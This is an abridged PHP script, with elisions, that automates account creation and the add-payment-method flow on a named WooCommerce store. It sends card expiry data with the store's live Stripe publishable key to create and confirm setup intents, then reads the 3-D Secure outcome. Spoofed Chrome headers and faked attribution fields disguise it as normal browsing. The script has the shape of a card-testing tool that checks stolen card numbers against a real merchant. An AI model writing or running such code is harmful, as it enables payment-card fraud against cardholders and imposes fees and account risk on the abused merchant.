...
$get_url = "https://idfobs.com/my-account/";
...
$create_url = "https://idfobs.com/my-account/";
...
$create_headers = [
    ...
    "origin: https://idfobs.com",
    "priority: u=0, i",
    "referer: https://idfobs.com/my-account/",
    'sec-ch-ua: "Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
    "sec-ch-ua-mobile: ?0",
    'sec-ch-ua-platform: "Windows"',
    "sec-fetch-dest: document",
...
$create_data = http_build_query([
    ...
    "wc_order_attribution_session_entry" => "https://idfobs.com/my-account/",
    "wc_order_attribution_session_start_time" => "2025-06-26 13:06:15",
...
$pay_url = "https://idfobs.com/my-account/add-payment-method/";
...
$pay_headers = [
    ...
    "accept-language: en-US,en;q=0.9",
    "priority: u=0, i",
    "referer: https://idfobs.com/my-account/add-payment-method/",
    'sec-ch-ua: "Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
    "sec-ch-ua-mobile: ?0",
    'sec-ch-ua-platform: "Windows"',
    "sec-fetch-dest: document",
...
$st_payload = http_build_query([
    ...
    "card[exp_month]" => $mm,
    "card[exp_year]" => $yy,
    "referrer" => "https://idfobs.com",
    "key" => "pk_live_51M4uQZDyB0OH7ZzPyQdIpGd775BvO9ll8ONhiTwcbex3G5Nv2CUC8CGHjSaJFsfXR2YSDaqjDKj09Q5auJmMGgAQ00ln7tuNZP"
]);
...
$cseti_url = "https://idfobs.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent";
...
if ($securestate === 'requires_action') {
    ...
    if (($state == "succeeded") || ($state == "attempted") || ($state == "processing_error")){
        ...
        $get_url = "https://api.stripe.com/v1/setup_intents/{$cintent}?is_stripe_sdk=false&client_secret={$csecret}&key=pk_live_51M4uQZDyB0OH7ZzPyQdIpGd775BvO9ll8ONhiTwcbex3G5Nv2CUC8CGHjSaJFsfXR2YSDaqjDKj09Q5auJmMGgAQ00ln7tuNZP";
